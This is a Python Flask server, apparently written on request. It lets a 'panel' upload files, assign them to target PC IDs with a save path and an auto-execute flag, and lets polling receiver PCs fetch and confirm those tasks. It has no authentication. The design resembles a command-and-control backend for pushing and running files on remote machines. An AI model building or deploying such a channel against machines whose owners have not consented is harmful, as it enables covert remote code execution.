import os
from flask import Flask, request, jsonify, send_file
from werkzeug.utils import secure_filename

# --- Configuración del Servidor ---
UPLOAD_FOLDER = 'server_uploads' # Carpeta para guardar archivos
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

# Carpeta para guardar la configuración de cada PC (el 'Panel' que pediste)
PC_CONFIGS = {}

app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

# --- Rutas de Archivos ---

# 1. Ruta para que el Panel Suba el Archivo
@app.route('/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return jsonify({'error': 'No se encontró el archivo'}), 400
    
    file = request.files['file']
    filename = secure_filename(file.filename)
    
    # Guarda el archivo en el servidor
    file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
    
    # Obtener metadatos del envío (PC Destino, Ruta de Guardado, Auto-ejecución)
    target_pc_id = request.form.get('target_pc_id')
    save_path = request.form.get('save_path', '')
    auto_execute = request.form.get('auto_execute', 'false') == 'true'

    # Almacenar la configuración de la transferencia para el cliente receptor
    if target_pc_id:
        PC_CONFIGS[target_pc_id] = {
            'filename': filename,
            'save_path': save_path,
            'auto_execute': auto_execute,
            'status': 'PENDING'
        }
    
    return jsonify({'message': f'Archivo {filename} subido y configurado para {target_pc_id}'}), 200

# 2. Ruta para que el Receptor Descargue el Archivo
@app.route('/download/<filename>', methods=['GET'])
def download_file(filename):
    path = os.path.join(app.config['UPLOAD_FOLDER'], secure_filename(filename))
    if os.path.exists(path):
        return send_file(path, as_attachment=True)
    return jsonify({'error': 'Archivo no encontrado'}), 404

# --- Rutas de Configuración y Control ---

# 3. Ruta para que el Receptor pregunte si tiene tareas pendientes
@app.route('/check_task/<pc_id>', methods=['GET'])
def check_task(pc_id):
    # Devuelve la tarea pendiente para ese PC, si existe
    task = PC_CONFIGS.get(pc_id)
    if task and task['status'] == 'PENDING':
        return jsonify(task), 200
    return jsonify({'message': 'No hay tareas pendientes'}), 200

# 4. Ruta para que el Receptor Confirme que la tarea se completó
@app.route('/task_complete/<pc_id>', methods=['POST'])
def task_complete(pc_id):
    if pc_id in PC_CONFIGS:
        PC_CONFIGS[pc_id]['status'] = 'COMPLETED'
        # Opcional: limpiar la entrada después de completarse
        # del PC_CONFIGS[pc_id]
        return jsonify({'message': f'Tarea para {pc_id} marcada como completada'}), 200
    return jsonify({'error': 'PC ID no encontrado o tarea no pendiente'}), 404

# 5. Ruta para Obtener la Lista de PCs activas
@app.route('/active_pcs', methods=['GET'])
def active_pcs():
    # En un sistema real, esto debería rastrear PCs conectadas.
    # Aquí simplemente devolvemos la lista de PCs que tienen una configuración almacenada.
    return jsonify({'active_ids': list(PC_CONFIGS.keys())}), 200

if __name__ == '__main__':
    # Usamos host 0.0.0.0 para que sea accesible desde fuera (importante para Render)
    app.run(host='0.0.0.0', port=5000)
